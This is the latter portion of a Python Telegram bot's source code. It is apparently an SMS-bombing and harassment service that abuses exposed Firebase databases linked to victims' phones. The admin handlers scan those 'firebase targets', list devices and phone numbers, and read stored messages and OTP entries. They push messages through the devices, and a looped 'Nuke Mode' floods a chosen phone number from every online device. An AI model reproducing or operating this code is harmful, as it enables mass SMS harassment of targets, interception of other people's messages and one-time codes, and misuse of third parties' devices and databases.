@dp.callback_query(F.data.startswith("a:ban:"))
async def cb_ban(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    uid = int(c.data.split(":")[2])
    _exec("UPDATE users SET banned=1-banned WHERE user_id=?", (uid,))
    log_action(c.from_user.id, "admin_toggle_ban", str(uid))
    await c.answer("Status changed.", show_alert=True)


@dp.callback_query(F.data == "a:bcast")
async def cb_bcast(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.broadcast)
    await c.message.edit_text("📢 Send the broadcast message.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.broadcast, F.text)
async def fsm_broadcast(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "")
    if txt.startswith("/"):
        return await state.clear()
    await state.clear()
    asyncio.create_task(_do_broadcast(m))


async def _do_broadcast(m: types.Message):
    users = _exec("SELECT user_id FROM users WHERE banned=0", fetch="all")
    sent = failed = 0
    status = await m.answer(f"📢 Broadcasting to {len(users)} users...")
    for row in users:
        try:
            await bot.send_message(row["user_id"], m.html_text or "")
            sent += 1
        except Exception:
            failed += 1
        await asyncio.sleep(0.05)
    try:
        await status.edit_text(f"✅ Sent {sent}, failed {failed}",
                                reply_markup=admin_kb())
    except Exception:
        pass
    log_action(m.from_user.id, "admin_broadcast",
               f"sent={sent} failed={failed}")


@dp.callback_query(F.data.startswith("a:logs:"))
async def cb_logs(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    page = int(c.data.split(":")[2])
    per = 15
    total = _exec("SELECT COUNT(*) c FROM logs", fetch="one")["c"]
    max_p = max(0, (total - 1) // per)
    page = min(page, max_p)
    rows = _exec("SELECT * FROM logs ORDER BY ts DESC LIMIT ? OFFSET ?",
                 (per, page * per), fetch="all")
    lines = []
    for r in rows:
        t = time.strftime("%m-%d %H:%M", time.localtime(r["ts"]))
        lines.append(f"<code>{t}</code> | <code>{r['user_id']}</code> | "
                     f"{r['action']} | {r['detail'][:30]}")
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton(text="⬅️",
                                        callback_data=f"a:logs:{page-1}"))
    if page < max_p:
        nav.append(InlineKeyboardButton(text="➡️",
                                        callback_data=f"a:logs:{page+1}"))
    kb = ([nav] if nav else []) + \
         [[InlineKeyboardButton(text="⬅️ Back", callback_data="a:home")]]
    await c.message.edit_text(
        f"📋 <b>Logs</b> — page {page+1}/{max_p+1}\n\n" +
        ("\n".join(lines) or "empty"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb))
    await c.answer()


@dp.callback_query(F.data == "a:export")
async def cb_export(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    rows = _exec("SELECT * FROM users", fetch="all")
    buf = io.StringIO()
    w = csv.writer(buf)
    w.writerow(["user_id", "username", "first_name", "credits", "coins",
                "banned", "lifetime", "total_bombs", "total_sent",
                "total_pushes", "ref_count", "created_at"])
    for r in rows:
        w.writerow([r["user_id"], r["username"], r["first_name"],
                    r["credits"], r["coins"], r["banned"], r["lifetime"],
                    r["total_bombs"], r["total_sent"], r["total_pushes"],
                    r["ref_count"], r["created_at"]])
    await c.message.answer_document(
        BufferedInputFile(buf.getvalue().encode(), filename="users.csv"),
        caption=f"📤 {len(rows)} users exported")
    await c.answer()


# ─────────────────────────────────────────────────────────────
# ADMIN — FIREBASE PANEL
# ─────────────────────────────────────────────────────────────
@dp.callback_query(F.data == "a:fb")
async def cb_fb_admin(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.clear()
    total = _exec("SELECT COUNT(*) c FROM firebase_targets",
                  fetch="one")["c"]
    reach = _exec("SELECT COUNT(*) c FROM firebase_targets WHERE reachable=1",
                  fetch="one")["c"]
    online = _exec("SELECT COALESCE(SUM(online_count),0) s "
                   "FROM firebase_targets", fetch="one")["s"]
    dev = _exec("SELECT COALESCE(SUM(device_count),0) s FROM firebase_targets",
                fetch="one")["s"]
    await c.message.edit_text(
        f"🔥 <b>Firebase Admin Panel</b>\n\n"
        f"Targets: <b>{total}</b> · Reachable: <b>{reach}</b>\n"
        f"🟢 Online: <b>{online}</b> · 📱 Devices: <b>{dev}</b>",
        reply_markup=fb_admin_kb())
    await c.answer()


@dp.callback_query(F.data == "a:fb_status")
async def cb_fb_status(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    rows = _exec("SELECT * FROM firebase_targets ORDER BY online_count DESC, "
                 "id LIMIT 20", fetch="all")
    lines = []
    for r in rows:
        mark = "✅" if r["reachable"] else "❌"
        last = "never"
        if r["last_scan"]:
            last = time.strftime("%m-%d %H:%M",
                                 time.localtime(r["last_scan"]))
        lines.append(
            f"{mark} <code>#{r['id']}</code> "
            f"🟢{r['online_count']}/{r['total_count']} "
            f"📱{r['device_count']} 🔐{r['otp_count']} 🕒{last}\n"
            f"  <code>{r['name'][:40]}</code>")
    await c.message.edit_text(
        "📊 <b>Firebase Status</b>\n\n" +
        ("\n".join(lines) or "none"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔄 Scan Now",
                                  callback_data="a:fb_scan")],
            [InlineKeyboardButton(text="⬅️ Back", callback_data="a:fb")]]))
    await c.answer()


@dp.callback_query(F.data == "a:fb_scan")
async def cb_fb_scan(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await c.answer("Scan started.", show_alert=True)
    status = await c.message.edit_text("🔄 Scanning firebase...")
    asyncio.create_task(_fb_scan_task(status))


async def _fb_scan_task(status_msg):
    async def progress(i, total, ok, fail):
        try:
            await status_msg.edit_text(
                f"🔄 <b>Scanning...</b>\n\n"
                f"Progress: <b>{i}/{total}</b>\n"
                f"✅ Reachable: {ok}\n"
                f"❌ Failed: {fail}")
        except Exception:
            pass
    ok, fail, total = await scan_all_firebase(progress_cb=progress)
    dev = _exec("SELECT COALESCE(SUM(device_count),0) s FROM firebase_targets",
                fetch="one")["s"]
    online = _exec("SELECT COALESCE(SUM(online_count),0) s "
                   "FROM firebase_targets", fetch="one")["s"]
    otps = _exec("SELECT COALESCE(SUM(otp_count),0) s FROM firebase_targets",
                 fetch="one")["s"]
    try:
        await status_msg.edit_text(
            f"✅ <b>Scan complete</b>\n\n"
            f"Total: <b>{total}</b> · Reachable: <b>{ok}</b> · Failed: <b>{fail}</b>\n"
            f"🟢 Online: <b>{online}</b>\n"
            f"📱 Devices: <b>{dev}</b>\n"
            f"🔐 OTP/Msg entries: <b>{otps}</b>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📊 Status",
                                      callback_data="a:fb_status")],
                [InlineKeyboardButton(text="⬅️ Back",
                                      callback_data="a:fb")]]))
    except Exception:
        pass


@dp.callback_query(F.data == "a:fb_devices")
async def cb_fb_devices_prompt(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.fb_view_devices)
    await c.message.edit_text(
        "📱 <b>View Devices</b>\n\n"
        "Send firebase ID (or 0 for the busiest).\n\n"
        "Open Status first to see IDs.",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.fb_view_devices, F.text)
async def fsm_fb_view(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    if not txt.isdigit():
        return await m.answer("Numeric ID required.")
    fid = int(txt)
    if fid == 0:
        row = _exec("SELECT * FROM firebase_targets "
                    "ORDER BY online_count DESC LIMIT 1", fetch="one")
        if not row:
            await state.clear()
            return await m.answer("No firebase targets.")
        fid = row["id"]
    t = _exec("SELECT * FROM firebase_targets WHERE id=?", (fid,),
              fetch="one")
    if not t:
        await state.clear()
        return await m.answer("Not found.")
    devices = _exec(
        "SELECT * FROM firebase_devices WHERE firebase_id=? "
        "AND device_key NOT LIKE 'otp_%' "
        "ORDER BY id DESC LIMIT 40", (fid,), fetch="all")
    await state.clear()
    if not devices:
        return await m.answer(
            f"📱 <b>{t['name']}</b>\n\nNo devices scanned yet.",
            reply_markup=admin_back_kb())
    lines = []
    for d in devices:
        try:
            obj = json.loads(d["info"]) if d["info"] else {}
        except Exception:
            obj = {}
        online = "🟢" if _extract_online(obj) else "⚫"
        num = d["phone"] or "-"
        lines.append(f"{online} <code>{d['device_key'][:20]}</code> · "
                     f"📞{num}")
    text = (f"📱 <b>{t['name']}</b>\n"
            f"🟢 {t['online_count']}/{t['total_count']} online\n\n" +
            "\n".join(lines))
    if len(text) > 3800:
        text = text[:3800] + "\n…"
    await m.answer(text, reply_markup=admin_back_kb())


@dp.callback_query(F.data == "a:fb_msgs")
async def cb_fb_msgs_prompt(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.fb_view_messages)
    await c.message.edit_text(
        "💬 <b>Device Messages</b>\n\n"
        "Send: <code>fid device_id</code>\n\n"
        "Example: <code>1 abc123xyz</code>\n\n"
        "Get device IDs from View Devices.",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.fb_view_messages, F.text)
async def fsm_fb_msgs(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    parts = txt.split(maxsplit=1)
    if len(parts) != 2 or not parts[0].isdigit():
        return await m.answer("Format: <code>fid device_id</code>")
    fid = int(parts[0])
    dev = parts[1].strip()
    await state.clear()
    status = await m.answer("💬 Reading messages...")
    try:
        msgs = await get_device_messages(fid, dev, limit=60)
    except Exception as e:
        msgs = []
        log.warning("msg read fail: %s", e)
    if not msgs:
        return await status.edit_text(
            f"💬 No messages found for <code>{dev}</code>.",
            reply_markup=admin_back_kb())
    lines = []
    for (path, val) in msgs[:60]:
        val_short = val[:80].replace("\n", " ")
        lines.append(f"<b>{path[:30]}</b>: <code>{val_short}</code>")
    text = (f"💬 <b>Messages</b> · device <code>{dev}</code>\n"
            f"Total: <b>{len(msgs)}</b>\n\n" + "\n".join(lines))
    if len(text) > 3800:
        text = text[:3800] + "\n…"
    try:
        await status.edit_text(text, reply_markup=admin_back_kb())
    except Exception:
        await m.answer(text, reply_markup=admin_back_kb())


# ── Test Slots ──
@dp.callback_query(F.data == "a:fb_slot1")
async def cb_fb_slot1(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    row = fb_test_slot_get(1)
    if not row:
        await c.message.edit_text(
            "🎯 <b>Test ID 1</b>\n\nNot set.\n\n"
            "Set a device to this slot.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎯 Set device",
                                      callback_data="f:slot_set:1")],
                [InlineKeyboardButton(text="⬅️ Back",
                                      callback_data="a:fb")]]))
    else:
        t = _exec("SELECT * FROM firebase_targets WHERE id=?",
                  (row["firebase_id"],), fetch="one")
        name = t["name"] if t else f"#{row['firebase_id']}"
        await c.message.edit_text(
            f"🎯 <b>Test ID 1</b>\n\n"
            f"Device: <code>{row['device_key']}</code>\n"
            f"Firebase: <code>{name}</code>",
            reply_markup=fb_slot_kb(1))
    await c.answer()


@dp.callback_query(F.data == "a:fb_slot2")
async def cb_fb_slot2(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    row = fb_test_slot_get(2)
    if not row:
        await c.message.edit_text(
            "🎯 <b>Test ID 2</b>\n\nNot set.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🎯 Set device",
                                      callback_data="f:slot_set:2")],
                [InlineKeyboardButton(text="⬅️ Back",
                                      callback_data="a:fb")]]))
    else:
        t = _exec("SELECT * FROM firebase_targets WHERE id=?",
                  (row["firebase_id"],), fetch="one")
        name = t["name"] if t else f"#{row['firebase_id']}"
        await c.message.edit_text(
            f"🎯 <b>Test ID 2</b>\n\n"
            f"Device: <code>{row['device_key']}</code>\n"
            f"Firebase: <code>{name}</code>",
            reply_markup=fb_slot_kb(2))
    await c.answer()


@dp.callback_query(F.data.startswith("f:slot_set:"))
async def cb_fb_slot_set(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    slot = int(c.data.split(":")[2])
    await state.set_state(AdminFSM.fb_slot_set)
    await state.update_data(slot=slot)
    await c.message.edit_text(
        f"🎯 Set Test ID {slot}\n\n"
        f"Send: <code>fid device_id</code>\n"
        f"Example: <code>1 abc123</code>",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.fb_slot_set, F.text)
async def fsm_fb_slot_set(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    parts = txt.split(maxsplit=1)
    if len(parts) != 2 or not parts[0].isdigit():
        return await m.answer("Format: <code>fid device_id</code>")
    fid = int(parts[0])
    dev = parts[1].strip()
    d = await state.get_data()
    slot = d.get("slot")
    fb_test_slot_set(slot, fid, dev)
    log_action(m.from_user.id, "fb_slot_set", f"slot={slot} fid={fid} dev={dev}")
    await state.clear()
    await m.answer(
        f"✅ Test ID {slot} = device <code>{dev}</code>",
        reply_markup=admin_kb())


@dp.callback_query(F.data.startswith("f:slot_clear:"))
async def cb_fb_slot_clear(c: types.CallbackQuery):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    slot = int(c.data.split(":")[2])
    fb_test_slot_clear(slot)
    await c.answer(f"Cleared slot {slot}.", show_alert=True)


@dp.callback_query(F.data.startswith("f:slot_fire:"))
async def cb_fb_slot_fire(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    slot = int(c.data.split(":")[2])
    row = fb_test_slot_get(slot)
    if not row:
        return await c.answer("Slot not set.", show_alert=True)
    await state.set_state(AdminFSM.fb_slot_fire_num)
    await state.update_data(slot=slot)
    await c.message.edit_text(
        f"🎯 Fire from Test ID {slot}\n\n"
        f"Send target phone number.",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.fb_slot_fire_num, F.text)
async def fsm_fb_slot_fire_num(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    digits = "".join(c for c in txt if c.isdigit())
    if len(digits) < 10:
        return await m.answer("Invalid number.")
    await state.update_data(number=digits[-10:])
    await state.set_state(AdminFSM.fb_slot_fire_msg)
    await m.answer("Now send the message body.")


@dp.message(AdminFSM.fb_slot_fire_msg, F.text)
async def fsm_fb_slot_fire_msg(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    d = await state.get_data()
    slot = d.get("slot")
    number = d.get("number")
    await state.clear()
    status = await m.answer(
        f"🎯 Firing from Test ID {slot} → <code>{number}</code>...")
    ok, info = await fb_test_fire(slot, number, txt[:200])
    log_action(m.from_user.id, "fb_slot_fire",
               f"slot={slot} num={number} ok={ok}")
    if ok:
        await status.edit_text(
            f"✅ Delivered from Test ID {slot}\n\n"
            f"🎯 <code>{number}</code>\n"
            f"📨 <code>{txt[:60]}</code>\n"
            f"📡 {info}",
            reply_markup=admin_back_kb())
    else:
        await status.edit_text(
            f"❌ Failed from Test ID {slot}\n\n"
            f"Reason: {info}",
            reply_markup=admin_back_kb())


# ── Broadcast push ──
@dp.callback_query(F.data == "a:fb_push")
async def cb_fb_push_prompt(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.fb_push_id)
    await c.message.edit_text(
        "📨 <b>Push Broadcast</b>\n\n"
        "Send firebase ID (or 0 for busiest).",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.fb_push_id, F.text)
async def fsm_fb_push_id(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    if not txt.isdigit():
        return await m.answer("Numeric ID required.")
    fid = int(txt)
    if fid == 0:
        row = _exec("SELECT * FROM firebase_targets "
                    "ORDER BY online_count DESC LIMIT 1", fetch="one")
        if not row:
            await state.clear()
            return await m.answer("No targets.")
        fid = row["id"]
    t = _exec("SELECT * FROM firebase_targets WHERE id=?", (fid,),
              fetch="one")
    if not t:
        await state.clear()
        return await m.answer("Not found.")
    await state.update_data(fb_push_id=fid)
    await state.set_state(AdminFSM.fb_push_msg)
    await m.answer(
        f"📨 Push to <b>{t['name']}</b>\n\nStep 2/2: Message text.")


@dp.message(AdminFSM.fb_push_msg, F.text)
async def fsm_fb_push_msg(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    d = await state.get_data()
    fid = d.get("fb_push_id")
    t = _exec("SELECT * FROM firebase_targets WHERE id=?", (fid,),
              fetch="one")
    if not t:
        await state.clear()
        return await m.answer("Target missing.")
    message = txt[:300]
    await state.clear()
    status = await m.answer(f"📨 Pushing to <b>{t['name']}</b>...")
    try:
        ok, node = await push_firebase(fid, t["url"], message,
                                        send_node=t["send_node"])
    except Exception:
        ok, node = False, None
    if ok:
        await status.edit_text(
            f"✅ Push delivered\n\n"
            f"🎯 {t['name']}\n"
            f"📡 Node: <code>{node}.json</code>",
            reply_markup=admin_back_kb())
    else:
        await status.edit_text(
            f"❌ Push failed\n\nTarget: {t['name']}",
            reply_markup=admin_back_kb())
    log_action(m.from_user.id, "admin_fb_push", f"fid={fid} ok={ok}")


# ── Nuke ──
@dp.callback_query(F.data == "a:fb_nuke")
async def cb_fb_nuke_prompt(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.fb_nuke_fid)
    await c.message.edit_text(
        "💣 <b>Nuke Mode</b>\n\n"
        "Continuous fire from every online device, looped.\n\n"
        "Send firebase ID (or 0 for busiest).",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.fb_nuke_fid, F.text)
async def fsm_fb_nuke_fid(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    if not txt.isdigit():
        return await m.answer("Numeric ID.")
    fid = int(txt)
    if fid == 0:
        row = _exec("SELECT * FROM firebase_targets "
                    "ORDER BY online_count DESC LIMIT 1", fetch="one")
        if not row:
            await state.clear()
            return await m.answer("No targets.")
        fid = row["id"]
    t = _exec("SELECT * FROM firebase_targets WHERE id=?", (fid,),
              fetch="one")
    if not t:
        await state.clear()
        return await m.answer("Not found.")
    await state.update_data(nuke_fid=fid)
    await state.set_state(AdminFSM.fb_nuke_number)
    await m.answer(
        f"💣 Nuke on <b>{t['name']}</b>\n\n"
        f"Send target phone number.")


@dp.message(AdminFSM.fb_nuke_number, F.text)
async def fsm_fb_nuke_number(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    digits = "".join(c for c in txt if c.isdigit())
    if len(digits) < 10:
        return await m.answer("Invalid number.")
    await state.update_data(number=digits[-10:])
    await state.set_state(AdminFSM.fb_nuke_msg)
    await m.answer("Now send the message text.")


@dp.message(AdminFSM.fb_nuke_msg, F.text)
async def fsm_fb_nuke_msg(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    d = await state.get_data()
    fid = d.get("nuke_fid")
    number = d.get("number")
    await state.clear()
    t = _exec("SELECT * FROM firebase_targets WHERE id=?", (fid,),
              fetch="one")
    if not t:
        return await m.answer("Firebase missing.")

    stop_ev = asyncio.Event()
    FB_SEND_STOPS[m.from_user.id] = stop_ev

    status = await m.answer(
        f"💣 <b>NUKE</b>\n\n"
        f"🎯 <code>{number}</code>\n"
        f"📨 <code>{txt[:50]}</code>\n"
        f"Firing...",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🛑 Stop nuke",
                                  callback_data="f:stop")]
        ]))

    asyncio.create_task(_run_nuke(status, m.from_user.id, t, number,
                                   txt[:200], stop_ev))


async def _run_nuke(status_msg, uid, t, number, message, stop_ev):
    last_update = 0.0

    async def progress(done, total, sent):
        nonlocal last_update
        n = time.time()
        if n - last_update < 1.5:
            return
        last_update = n
        try:
            await status_msg.edit_text(
                f"💣 <b>NUKE</b>\n\n"
                f"🎯 <code>{number}</code>\n"
                f"📨 Round: <b>{done}</b> · Sent total: <b>{sent}</b>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🛑 Stop",
                                          callback_data="f:stop")]
                ]))
        except Exception:
            pass

    try:
        sent, rounds, err = await nuke_firebase(
            t["id"], t["url"], number, message,
            send_node=t["send_node"], stop_ev=stop_ev,
            progress_cb=progress)
    except Exception as e:
        log.exception("nuke crashed")
        sent, rounds, err = 0, 0, str(e)[:100]
    finally:
        FB_SEND_STOPS.pop(uid, None)
    try:
        await status_msg.edit_text(
            f"{'🛑 Stopped' if stop_ev.is_set() else '✅'} <b>Nuke ended</b>\n\n"
            f"🎯 <code>{number}</code>\n"
            f"📨 Total sent: <b>{sent}</b>\n"
            f"🔁 Rounds: <b>{rounds}</b>"
            + (f"\n⚠️ {err}" if err else ""),
            reply_markup=admin_back_kb())
    except Exception:
        pass
    log_action(uid, "fb_nuke", f"fid={t['id']} sent={sent} rounds={rounds}")


# ── Add / Remove ──
@dp.callback_query(F.data == "a:fb_add")
async def cb_fb_add(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.fb_add_url)
    await c.message.edit_text(
        "➕ <b>Add Firebase Target</b>\n\n"
        "Send the firebase URL.",
        reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.fb_add_url, F.text)
async def fsm_fb_add(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    url = _norm_fb_url(txt)
    if not url or "://" not in url:
        return await m.answer("Send a valid URL.")
    try:
        host = url.split("//", 1)[1].rstrip("/")
    except Exception:
        host = url
    name = host[:120]
    clash = _exec("SELECT 1 FROM firebase_targets WHERE name=?",
                  (name,), fetch="one")
    if clash:
        name = name[:100] + "_" + str(abs(hash(url)))[:8]
    try:
        _exec("INSERT OR IGNORE INTO firebase_targets(name,url,active,"
              "created_at) VALUES(?,?,1,?)",
              (name, url, int(time.time())))
        await m.answer(f"✅ Added <code>{url}</code>",
                       reply_markup=admin_kb())
    except Exception as e:
        await m.answer(f"❌ {e}")
    await state.clear()


@dp.callback_query(F.data == "a:fb_remove")
async def cb_fb_remove(c: types.CallbackQuery, state: FSMContext):
    if not is_admin(c.from_user.id):
        return await c.answer("not admin", show_alert=True)
    await state.set_state(AdminFSM.fb_remove_id)
    await c.message.edit_text("🗑 Send firebase ID to remove.",
                              reply_markup=admin_back_kb())
    await c.answer()


@dp.message(AdminFSM.fb_remove_id, F.text)
async def fsm_fb_remove(m: types.Message, state: FSMContext):
    if not is_admin(m.from_user.id):
        return
    txt = (m.text or "").strip()
    if txt.startswith("/"):
        return await state.clear()
    if not txt.isdigit():
        return await m.answer("Numeric ID.")
    fid = int(txt)
    _exec("DELETE FROM firebase_targets WHERE id=?", (fid,))
    _exec("DELETE FROM firebase_devices WHERE firebase_id=?", (fid,))
    await state.clear()
    await m.answer(f"✅ Removed firebase {fid}",
                   reply_markup=admin_kb())


# ─────────────────────────────────────────────────────────────
# HEALTH SERVER
# ─────────────────────────────────────────────────────────────
async def _health_handler(request):
    return aiohttp.web.Response(
        text="Bot is running", content_type="text/plain", status=200)


async def _run_health_server():
    app = aiohttp.web.Application()
    app.router.add_get("/", _health_handler)
    runner = aiohttp.web.AppRunner(app)
    await runner.setup()
    try:
        site = aiohttp.web.TCPSite(runner, host="0.0.0.0", port=PORT)
        await site.start()
        log.info("health server on 0.0.0.0:%d", PORT)
    except OSError as e:
        log.error("health bind failed: %s", e)
        await runner.cleanup()
        return
    try:
        await asyncio.Event().wait()
    finally:
        await runner.cleanup()


# ─────────────────────────────────────────────────────────────
# STARTUP
# ─────────────────────────────────────────────────────────────
async def _periodic_prune():
    while True:
        try:
            prune_logs()
        except Exception:
            log.exception("prune failed")
        await asyncio.sleep(6 * 3600)


async def main():
    init_db()
    a = _exec("SELECT COUNT(*) c FROM apis", fetch="one")["c"]
    f = _exec("SELECT COUNT(*) c FROM firebase_targets", fetch="one")["c"]
    log.info("bot starting | port=%d | apis=%d | firebase=%d", PORT, a, f)
    await bot.delete_webhook(drop_pending_updates=True)

    prune_task = asyncio.create_task(_periodic_prune())
    health_task = asyncio.create_task(_run_health_server())

    try:
        await dp.start_polling(bot)
    finally:
        for t in (health_task, prune_task):
            if t and not t.done():
                t.cancel()
        for t in (health_task, prune_task):
            try:
                await t
            except (asyncio.CancelledError, Exception):
                pass
        try:
            await bot.session.close()
        except Exception:
            pass
        try:
            _conn.close()
        except Exception:
            pass


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except (KeyboardInterrupt, SystemExit):
        pass